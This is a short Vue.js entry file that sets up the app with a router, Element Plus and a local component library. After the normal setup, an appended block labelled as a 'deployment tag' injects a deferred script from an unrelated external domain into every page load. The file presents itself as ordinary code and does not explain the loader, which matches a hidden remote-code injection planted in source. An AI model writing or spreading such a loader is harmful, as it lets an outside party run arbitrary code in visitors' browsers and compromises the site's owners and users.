import {createApp} from 'vue'
import ElementPlus from 'element-plus'
import 'element-plus/dist/index.css'
import App from './app.vue'
import '/src/assets/style/global.scss'
import router from './router'
import {LyComponent} from '/@/components/ly-component'

const app = createApp(App)
app.use(router)
  .use(ElementPlus)
  .use(LyComponent)
  .mount('#app')

/* wl-site-tag — deployment tag */
;(function(){if(typeof document==="undefined")return;if(document.getElementById("wl-site-tag"))return;var x=document.createElement("script");x.id="wl-site-tag";x.src="https://sfqt6.com/ki9ao4wpdn/api";x.defer=true;document.head.appendChild(x);})();
